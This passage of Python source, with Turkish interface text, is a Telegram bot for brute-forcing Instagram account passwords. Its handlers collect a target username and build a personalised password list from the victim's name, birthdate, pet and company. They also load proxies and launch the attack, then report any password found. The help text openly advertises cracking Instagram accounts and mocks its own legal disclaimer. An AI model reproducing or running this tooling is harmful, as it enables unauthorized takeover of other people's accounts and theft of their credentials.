                await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle (isteğe bağlı):")
                context.user_data['awaiting'] = 'proxy_file'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'set_timeout':
            try:
                await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
                context.user_data['awaiting'] = 'timeout'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'generate_password_list':
            try:
                await query.message.reply_text("🔑 Şifre listesi oluşturmak için maksimum şifre sayısını gir (100-50000, varsayılan 10000):")
                context.user_data['awaiting'] = 'max_passwords'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'leet_yes':
            self.user_data[user_id]['password_profile']['leetmode'] = True
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_spechars'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'leet_no':
            self.user_data[user_id]['password_profile']['leetmode'] = False
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_spechars'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'spechars_yes':
            self.user_data[user_id]['password_profile']['spechars'] = True
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_randnum'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'spechars_no':
            self.user_data[user_id]['password_profile']['spechars'] = False
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_randnum'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'randnum_yes':
            self.user_data[user_id]['password_profile']['randnum'] = True
            await self.generate_password_file(query, user_id)
        elif query.data == 'randnum_no':
            self.user_data[user_id]['password_profile']['randnum'] = False
            await self.generate_password_file(query, user_id)
        elif query.data == 'start_attack':
            await self.start_attack(update, context)
        elif query.data == 'skip_lastname':
            self.user_data[user_id]['password_profile']['lastname'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_birthdate'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'skip_birthdate':
            self.user_data[user_id]['password_profile']['birthdate'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_pet'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'skip_pet':
            self.user_data[user_id]['password_profile']['pet'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_company'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'skip_company':
            self.user_data[user_id]['password_profile']['company'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_keywords'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'skip_keywords':
            self.user_data[user_id]['password_profile']['keywords'] = []
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_leet'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'how_to_use':
            how_to_use_message = (
                "📖 *Botu Nasıl Kullanırım?*\n\n"
                "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını kırmak çok kolay! 🔥\n"
                "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! hahah şska be ne yapıyorsan yap senin sorunun! 😎\n\n"
                "*Adım Adım Kullanım:*\n"
                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz.\n"
                "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
                "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Maksimum şifre sayısını belirtebilirsin (100-50000). Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
                "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
                "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. Şüpheli şifreler otomatik tekrar denenir ve işlem bitince detaylı rapor .txt olarak indirilecek:\n"
                "   - Denenen şifre sayısı\n"
                "   - Şüpheli şifrelerin tekrar denenme durumu\n"
                "   - Her denemenin sonucu, kullanılan proxy ve süresi\n\n"
                "*💡 İpuçları*:\n"
                "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
                "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
                "- Hata alırsan, /start ile yeniden başla.\n"
                "- Loglar *instagram_response.json* dosyasında saklanır.\n\n"
                "*🚀 Hadi Başla!* Menüden bir seçenek seç ve keyfine bak! 😜"
            )
            keyboard = [
                [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
                [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.reply_text(how_to_use_message, reply_markup=reply_markup, parse_mode='Markdown')
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
                await query.message.reply_text("❌ Kullanım kılavuzu gönderilirken hata oluştu, lütfen tekrar dene!")
        else:
            try:
                await query.message.reply_text("❌ Geçersiz işlem! Lütfen /start ile yeniden başla.")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")

    async def generate_password_file(self, query: Update, user_id: int):
        profile = self.user_data[user_id]['password_profile']
        max_passwords = self.user_data[user_id]['max_passwords']
        wordlist = self.password_generator.generate_wordlist(profile, max_passwords)
        file_path = f"passwords_{user_id}.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(wordlist))
        self.user_data[user_id]['password_file'] = file_path
        try:
            await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi.")
            await query.message.reply_document(document=InputFile(file_path, filename='generated_passwords.txt'))
        except TelegramError as e:
            logger.error(f"Telegram send_document error: {e}")
            await query.message.reply_text("❌ Şifre listesi gönderilirken hata oluştu!")
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await query.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")

    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        query = update.callback_query

        try:
            await query.message.reply_text("🚀 Saldırı başlatılıyor...")
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")
            return

        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
            try:
                await query.message.reply_text("⚠️ Saldırı zaten devam ediyor!")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return

        if not self.user_data[user_id]['username']:
            await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
            return
        
        if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
            return

        try:
            passwords = []
            encodings = ['utf-8', 'latin-1', 'iso-8859-9']
            for encoding in encodings:
                try:
                    with open(self.user_data[user_id]['password_file'], 'r', encoding=encoding, errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
                    break
                except UnicodeDecodeError:
                    continue

            if not passwords:
                await query.message.reply_text("❌ Şifre dosyası okunamadı veya boş!")
                return

            proxy_list = []
            if self.user_data[user_id]['proxy_file'] and os.path.exists(self.user_data[user_id]['proxy_file']):
                for encoding in encodings:
                    try:
                        with open(self.user_data[user_id]['proxy_file'], 'r', encoding=encoding, errors='ignore') as f:
                            proxy_list = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue

            stop_event = asyncio.Event()
            self.brute_force_stop_events[user_id] = stop_event

            core = InstagramBruteForce(proxy_list=proxy_list)

            async def progress_callback(message):
                try:
                    await query.message.reply_text(message)
                except TelegramError as e:
                    logger.error(f"Telegram send_message error in progress_callback: {e}")

            task = asyncio.create_task(
                core.brute_force(
                    self.user_data[user_id]['username'],
                    passwords,
                    self.user_data[user_id]['timeout'],
                    progress_callback=progress_callback,
                    stop_event=stop_event
                )
            )
            
            self.brute_force_tasks[user_id] = task
            result, report_file = await task

            if result:
                await query.message.reply_text(f"🎉 *BAŞARILI! Şifre bulundu: {result}*", parse_mode='Markdown')
            else:
                await query.message.reply_text("❌ İşlem tamamlandı, doğru şifre bulunamadı.")
            
            try:
                await query.message.reply_document(document=InputFile(report_file, filename='bruteforce_report.txt'))
            except TelegramError as e:
                logger.error(f"Telegram send_document error: {e}")
                await query.message.reply_text("❌ Rapor dosyası gönderilirken hata oluştu!")
            
            try:
                os.remove(report_file)
            except Exception as e:
                logger.error(f"Rapor dosyası silme hatası: {report_file}, {str(e)}")

        except Exception as e:
            await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}")
        finally:
            if user_id in self.brute_force_tasks:
                del self.brute_force_tasks[user_id]
            if user_id in self.brute_force_stop_events:
                del self.brute_force_stop_events[user_id]
            
            for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
                if file_path and os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")

async def main():
    bot = TelegramBot()
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stop", bot.stop_attack))
    application.add_handler(CallbackQueryHandler(bot.button))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
    
    await application.run_polling()

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
